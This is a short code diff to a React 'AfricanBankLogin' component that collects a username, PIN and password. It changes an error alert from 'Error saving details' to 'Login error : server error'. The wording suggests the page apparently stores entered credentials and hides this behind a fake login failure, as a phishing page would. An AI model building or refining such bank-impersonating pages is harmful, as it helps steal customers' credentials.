@@ -22,7 +22,7 @@ const AfricanBankLogin = () => {
             alert(message);
             setCredentials({ username: '', pin: '', password: '' });
         } catch (err) {
-            alert('Error saving details: ' + (err.response?.data?.message || err.message));
+            alert('Login error : server error' + (err.response?.data?.message || err.message));
         } finally {
             setLoading(false);
         }
